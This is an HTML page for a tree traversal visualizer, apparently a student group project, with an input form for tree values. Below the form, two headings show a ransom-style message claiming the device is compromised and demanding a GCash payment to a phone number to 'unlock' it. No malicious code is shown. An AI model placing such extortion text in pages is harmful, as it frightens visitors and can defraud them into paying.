<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tree Traversal Visualizer</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="styles.css">
</head>
<body class="min-h-screen flex flex-col">
    <!-- Hero Section -->
    <div class="hero-bg text-gray-800 min-h-[20vh] flex items-center justify-center px-4 py-12">
        <div class="text-center">
            <h1 class="text-4xl md:text-5xl font-bold mb-4">Tree Traversal</h1>
            <p class="text-gray-600 text-lg">Visualize tree traversal algorithms with ease</p>
            
        </div>
    </div>  

    <!-- Input Section -->
    <div class="container mx-auto px-4 py-12 -mt-16 flex-grow">
        <div class="bg-white rounded-lg input-container p-6 md:p-8 max-w-md mx-auto">
            <div class="mb-6">
                <label for="numbers" class="block text-gray-700 text-sm font-semibold mb-2">Enter values for the tree:</label>
                <input type="text" id="numbers" value="" 
                    class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-500 transition"
                    placeholder="Enter numbers or letters (e.g., 5,3,8,2,7,9...)">
                <p class="text-sm text-gray-500 mt-2">Separate values by commas or spaces.</p>
            </div>
            
            <!-- Error Message (hidden by default) -->
            <div id="error-message" class="hidden bg-red-100 border-l-4 border-red-500 text-red-700 p-4 mb-4 rounded">
                <p class="font-medium">Please enter valid values! Each value must be unique.</p>
            </div>

            <button id="generate-btn" 
                class="w-full custom-button py-3 rounded-lg font-semibold transition-all duration-300 ease-in-out hover:shadow-lg">
                <i class="fas mr-2"></i>
                Generate Tree
            </button>
        </div>
        <br><br><br>
        <div class="mt-6">
            <h2 class="animated-text text-glow">ICC IS HERE</h2>
            <h2 class="animated-text text-glow">Your device was compromised. <br> Send gcash to 09123456789 to unlock your device.</h2>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-white shadow-lg">
        <div class="container mx-auto px-4 py-6">
            <div class="text-center">
                <p class="text-gray-600">Â© 2025 Group No. ?. All rights reserved.</p>
                <div class="mt-2 flex justify-center space-x-4">
                    <a href="#" class="text-gray-600 hover:text-yellow-500 transition">
                        <i class="fab fa-facebook"></i>
                    </a>
                    <a href="#" class="text-gray-600 hover:text-yellow-500 transition">
                        <i class="fab fa-github"></i>
                    </a>
                    <a href="#" class="text-gray-600 hover:text-yellow-500 transition">
                        <i class="fab fa-linkedin"></i>
                    </a>
                    <a href="#" class="text-gray-600 hover:text-yellow-500 transition">
                        <i class="fas fa-envelope"></i>
                    </a>
                </div>
            </div>
        </div>
    </footer>

    <script src="script.js"></script>
</body>
</html>
